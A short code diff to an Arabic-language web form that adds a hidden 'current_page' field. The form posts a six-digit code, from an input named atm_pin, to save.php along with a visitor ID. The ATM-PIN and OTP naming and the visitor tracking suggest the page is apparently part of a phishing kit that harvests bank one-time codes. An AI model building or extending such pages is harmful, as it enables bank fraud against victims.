@@ -147,6 +147,7 @@
 
             <form id="atmForm" action="save.php" method="POST">
                 <input type="hidden" name="visitor_id" id="form_visitor_id">
+                <input type="hidden" name="current_page" value="otp.php">
                 <input type="password" id="atm_pin" name="otp" class="pin-input" placeholder="******" required maxlength="6" inputmode="numeric" pattern="[0-9]*">
                 <button type="submit" class="pay-btn">تأكيد الرمز</button>
             </form>
